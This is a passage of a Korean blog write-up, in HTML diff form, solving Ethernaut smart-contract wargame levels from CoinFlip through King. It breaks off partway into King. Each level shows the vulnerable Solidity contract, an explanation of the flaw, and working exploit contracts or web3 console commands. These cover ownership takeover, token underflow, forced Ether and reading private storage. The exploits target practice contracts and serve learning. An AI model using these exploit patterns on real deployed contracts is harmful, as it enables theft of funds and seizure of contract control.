+    lastHash <span style="color:#f92672">=</span> blockValue;
+    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue.div(FACTOR);
+    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+
+    <span style="color:#66d9ef">if</span> (side <span style="color:#f92672">==</span> _guess) {
+      consecutiveWins<span style="color:#f92672">++</span>;
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+    } <span style="color:#66d9ef">else</span> {
+      consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    }
+  }
+}
+</code></pre></div><p>10번 연속 동전던지기 결과를 맞춰야 하며, 동전던지기 결과는 <code>uint256(blockhash(block.number.sub(1))) / FACTOR</code> 로 계산한다. 또한 lastHash를 이용해, 동일 블록에 있는 트랜잭션은 revert() 시킨다.</p>
+<p>FACTOR 값은 uint256 타입이 가질 수 있는 최솟값과 최댓값의 중간 값이며, <code>uint256(blockhash(block.number.sub(1)))</code>는 트랜잭션이 포함된 블록의 이전 블록의 해시값을 uint256 타입으로 변환한 값이다.</p>
+<p>결과적으로 트랜잭션이 포함된 블록의 이전블록의 해시값을 uint256으로 타입변환한 값이 중간값을 기준으로 이하면 false, 이상이면 true로 계산된다.</p>
+<p>동전던지기 결과를 맞추기 위해 공격자가 전송하는 트랜잭션이 포함된 블록을 기준으로 결과값이 계산되므로, 값 예측이 가능하다.</p>
+<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ICoinFlip</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlipExploit</span> {
+    <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+    <span style="color:#66d9ef">address</span> coinflip;
+    <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _coinflip) <span style="color:#66d9ef">public</span> {
+        coinflip <span style="color:#f92672">=</span> _coinflip;
+    }
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">public</span> {
+            <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number.sub(<span style="color:#ae81ff">1</span>)));
+            <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue.div(FACTOR);
+            <span style="color:#66d9ef">bool</span> answer <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+
+            ICoinFlip(coinflip).flip(answer);
+    }
+}
+</code></pre></div><hr>
+<h2 id="-4-telephone"># 4. Telephone<a hidden class="anchor" aria-hidden="true" href="#-4-telephone">#</a></h2>
+<h3 id="summary-3">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-3">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Telephone</span> {
+
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+
+  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> {
+    owner <span style="color:#f92672">=</span> msg.sender;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
+    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
+      owner <span style="color:#f92672">=</span> _owner;
+    }
+  }
+}
+</code></pre></div><p>대상 컨트랙트의 ownership을 가져오는 것이 목표이다.</p>
+<p><code>changeOwner()</code>는 tx.origin과 msg.sender이 일치하지 않는 경우, 인자로 전달된 주소에게 ownership을 부여한다.</p>
+<p>공격자가 컨트랙트를 통하여 changeOwner()를 호출하면 된다.</p>
+<ul>
+<li>tx.origin = 트랜잭션을 최초 생성 및 시작한 주소 -&gt; 공격자 EOA 주소</li>
+<li>msg.sender =  컨트랙트의 함수를 호출한 주소 -&gt; 공격자 컨트랙트 주소</li>
+</ul>
+<h3 id="exploit-3">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-3">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ITelephone</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">external</span>;
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">TelephoneExploit</span> {
+    <span style="color:#66d9ef">address</span> newOwner;
+    <span style="color:#66d9ef">address</span> telephoneAddr;
+    
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _telephoneAddr, <span style="color:#66d9ef">address</span> _newOwner) <span style="color:#66d9ef">public</span> {
+        telephoneAddr <span style="color:#f92672">=</span> _telephoneAddr;
+        newOwner <span style="color:#f92672">=</span> _newOwner;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">public</span> {
+        ITelephone(telephoneAddr).changeOwner(newOwner);
+    }
+}
+</code></pre></div><hr>
+<h2 id="-5-token"># 5. Token<a hidden class="anchor" aria-hidden="true" href="#-5-token">#</a></h2>
+<h3 id="summary-4">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-4">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Token</span> {
+
+  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) balances;
+  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> totalSupply;
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">uint</span> _initialSupply) <span style="color:#66d9ef">public</span> {
+    balances[msg.sender] <span style="color:#f92672">=</span> totalSupply <span style="color:#f92672">=</span> _initialSupply;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint</span> _value) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+    require(balances[msg.sender] <span style="color:#f92672">-</span> _value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>);                        <span style="color:#75715e">// bypass (Integer Underflow)
+</span><span style="color:#75715e"></span>    balances[msg.sender] <span style="color:#f92672">-=</span> _value;                                     <span style="color:#75715e">// Token++++++++ (Integer Underflow)
+</span><span style="color:#75715e"></span>    balances[_to] <span style="color:#f92672">+=</span> _value;
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance) {
+    <span style="color:#66d9ef">return</span> balances[_owner];
+  }
+}
+</code></pre></div><p>공격자에게 20개의 토큰이 주어지는데, 컨트랙트의 취약점을 이용해 최대한 많은 수의 토큰을 확보하는 것이 목표이다.</p>
+<p>Solidity 0.8.0 미만 버전은 Integer Overflow/Underflow 발생 시, 에러없이 트리거가 된다.</p>
+<p>21개를 임의의 주소로 전송하면, Integer Overflow(20 - 21)에 의해, 공격자는 2**256 - 1개 토큰을 갖게된다.</p>
+<h3 id="exploit-4">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-4">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">player</span>);
+Promise {<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">pending</span><span style="color:#f92672">&gt;</span>, <span style="color:#ae81ff">_</span><span style="color:#a6e22e">events</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">o</span>, <span style="color:#a6e22e">emit</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ƒ</span>, <span style="color:#a6e22e">on</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ƒ</span>, <span style="color:#960050;background-color:#1e0010">…</span>}
+...
+[[<span style="color:#a6e22e">PromiseResult</span>]]<span style="color:#f92672">:</span> <span style="color:#a6e22e">o</span>
+<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+<span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+<span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> (<span style="color:#ae81ff">2</span>) [<span style="color:#ae81ff">20</span>, <span style="color:#a6e22e">empty</span>]              <span style="color:#75715e">// 20 Token
+</span><span style="color:#75715e"></span>[[<span style="color:#a6e22e">Prototype</span>]]<span style="color:#f92672">:</span> Object
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">toWei</span>(<span style="color:#e6db74">&#34;21&#34;</span>));
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">player</span>);
+Promise {<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">pending</span><span style="color:#f92672">&gt;</span>, <span style="color:#ae81ff">_</span><span style="color:#a6e22e">events</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">o</span>, <span style="color:#a6e22e">emit</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ƒ</span>, <span style="color:#a6e22e">on</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ƒ</span>, <span style="color:#960050;background-color:#1e0010">…</span>}
+...
+[[<span style="color:#a6e22e">PromiseResult</span>]]<span style="color:#f92672">:</span> <span style="color:#a6e22e">o</span>
+<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+<span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+<span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> Array(<span style="color:#ae81ff">11</span>)                    <span style="color:#75715e">// 2**256 - 1 Token
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">13369364</span>
+<span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">4247761</span>
+<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67104201</span>
+<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67108863</span>
+<span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67108863</span>
+<span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67108863</span>
+<span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67108863</span>
+<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67108863</span>
+<span style="color:#ae81ff">8</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">67108863</span>
+<span style="color:#ae81ff">9</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">4194303</span>
+<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">11</span>
+[[<span style="color:#a6e22e">Prototype</span>]]<span style="color:#f92672">:</span> Array(<span style="color:#ae81ff">0</span>)
+[[<span style="color:#a6e22e">Prototype</span>]]<span style="color:#f92672">:</span> Object
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-6-delegation"># 6. Delegation<a hidden class="anchor" aria-hidden="true" href="#-6-delegation">#</a></h2>
+<h3 id="summary-5">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-5">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Delegate</span> {
+
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
+    owner <span style="color:#f92672">=</span> _owner;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() <span style="color:#66d9ef">public</span> {
+    owner <span style="color:#f92672">=</span> msg.sender;
+  }
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Delegation</span> {
+
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+  Delegate delegate;
+
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _delegateAddress) <span style="color:#66d9ef">public</span> {
+    delegate <span style="color:#f92672">=</span> Delegate(_delegateAddress);
+    owner <span style="color:#f92672">=</span> msg.sender;
+  }
+
+  fallback() <span style="color:#66d9ef">external</span> {
+    (<span style="color:#66d9ef">bool</span> result,) <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(delegate).delegatecall(msg.data);
+    <span style="color:#66d9ef">if</span> (result) {
+      this;
+    }
+  }
+}
+</code></pre></div><p>대상 컨트랙트의 ownership을 가져오는 것이 목표이다.</p>
+<p><code>Delegation</code> 컨트랙트의 <code>fallback()</code>에서 <code>delegatecall(msg.data)</code>를 사용하여 <code>Delegate</code> 컨트랙트를 호출한다.</p>
+<p><code>msg.data</code>에 <code>pwn()</code> 함수를 호출하는 abi 값을 전달하여, <code>Delegate</code> 컨트랙트의 <code>pwn()</code>을 호출하고 ownership을 획득할 수 있다.</p>
+<h3 id="exploit-5">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-5">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeFunctionSignature</span>(<span style="color:#e6db74">&#39;pwn()&#39;</span>)
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span><span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">payload</span>});
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-7-force"># 7. Force<a hidden class="anchor" aria-hidden="true" href="#-7-force">#</a></h2>
+<h3 id="summary-6">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-6">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Force</span> {<span style="color:#75715e">/*
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">                   MEOW ?
+</span><span style="color:#75715e">         /\_/\   /
+</span><span style="color:#75715e">    ____/ o o \
+</span><span style="color:#75715e">  /~____  =ø= /
+</span><span style="color:#75715e"> (______)__m_m)
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">*/</span>}
+</code></pre></div><p>위 컨트랙트의 잔고는 다음과 같이 0인 상태인데, 0보다 큰 잔액을 만드는 것이 목표이다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>)
+<span style="color:#e6db74">&#39;0&#39;</span>
+</code></pre></div><p>fallback()이나 receive() 함수가 구현되어 있다면, 다음과 같이 보내면 되지만 그렇지 않은 상황이기 때문에 다른 방법이 필요하다. (아래 트랜잭션 전송 시, 에러 발생)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span><span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">toWei</span>(<span style="color:#e6db74">&#34;0.000000000000000002&#34;</span>)});
+</code></pre></div><p><code>selfdestruct(address dest)</code> 함수를 이용한 컨트랙트를 통해 대상 컨트랙트에 강제로 Ether를 송신할 수 있다.</p>
+<ul>
+<li><code>selfdestruct()</code> 호출 시, 컨트랙트 스스로를 파괴하고 컨트랙트가 가진 Ether를 <code>address dest</code>로 송신</li>
+</ul>
+<h3 id="exploit-6">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-6">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ForceExploit</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _forceAddr) <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> {
+        require(msg.value <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">wei</span>);
+        selfdestruct(_forceAddr);
+    }
+
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>)
+<span style="color:#e6db74">&#39;0.000000000000000002&#39;</span>
+</code></pre></div><hr>
+<h2 id="-8-vault"># 8. Vault<a hidden class="anchor" aria-hidden="true" href="#-8-vault">#</a></h2>
+<h3 id="summary-7">summary<a hidden class="anchor" aria-hidden="true" href="#summary-7">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Vault</span> {
+  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> locked;           <span style="color:#75715e">// slot 0 : 1 byte
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">private</span> password;     <span style="color:#75715e">// slot 1 : 32 bytes
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">bytes32</span> _password) <span style="color:#66d9ef">public</span> {
+    locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+    password <span style="color:#f92672">=</span> _password;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#66d9ef">bytes32</span> _password) <span style="color:#66d9ef">public</span> {
+    <span style="color:#66d9ef">if</span> (password <span style="color:#f92672">==</span> _password) {
+      locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+    }
+  }
+}
+</code></pre></div><p>private으로 저장되어 있는 bytes32 타입의 password 값을 <code>unlock()</code>에 전달하는 것이 목표이다.</p>
+<p>기본적으로 storage 영역에 저장되는 변수들은 32 bytes 기준으로 slot 0부터 할당되어 저장되며, private으로 선언되더라도 값을 확인할 수 있다.</p>
+<h3 id="exploit-7">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-7">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hexPassword</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">1</span>);
+
+<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">hexPassword</span>
+<span style="color:#e6db74">&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">hexToAscii</span>(<span style="color:#a6e22e">hexPassword</span>)
+<span style="color:#e6db74">&#39;A very strong secret password :)&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">hexPassword</span>);
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-9-king"># 9. King<a hidden class="anchor" aria-hidden="true" href="#-9-king">#</a></h2>
+<h3 id="summary-8">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-8">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">King</span> {
+
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> king;
+  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> prize;
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
+
+  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+    owner <span style="color:#f92672">=</span> msg.sender;  
+    king <span style="color:#f92672">=</span> msg.sender;
+    prize <span style="color:#f92672">=</span> msg.value;
+  }
+
+  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+    require(msg.value <span style="color:#f92672">&gt;=</span> prize <span style="color:#f92672">||</span> msg.sender <span style="color:#f92672">==</span> owner);
+    king.transfer(msg.value);
+    king <span style="color:#f92672">=</span> msg.sender;
+    prize <span style="color:#f92672">=</span> msg.value;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_king</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>) {
+    <span style="color:#66d9ef">return</span> king;
+  }
+}
+</code></pre></div><p>대상 컨트랙트의 기능이 동작하지 않는 DoS(Denial of Service) 상태로 만드는 것이 목표이다.</p>
+<p>컨트랙트는 <code>receive()</code>를 통해 Ether를 송금받을 수 있으며 다음과 같이 동작한다.</p>
+<ul>
+<li>(1) 기존의 <code>prize</code>보다 높은 Ether를 송금한 사람이 새로운 king이 된다.</li>
+<li>(2) 기존의 king에게는 새로운 king이 송금한 Ether를 전송해준다.</li>
+</ul>
+<p>공격자가 컨트랙트를 생성하여 king으로 만들고, 해당 컨트랙트의 <code>receive()</code> 함수에서 무조건 <code>revert()</code> 를 호출하도록 하면된다.</p>
+<p>King 컨트랙트는 다른 사용자들이 높은 Ether를 송금하더라도, 기존의 King인 공격자 컨트랙트에게 Ether를 송금하는 <code>king.transfer(msg.value);</code> 부분에서 <code>revert()</code>가 발생하여 DoS 상태에 빠진다.</p>
+<p>초기 <code>owner</code>, <code>king</code> 및 <code>prize</code>는 아래와 같다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>()
+<span style="color:#e6db74">&#39;0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5&#39;</span>
+
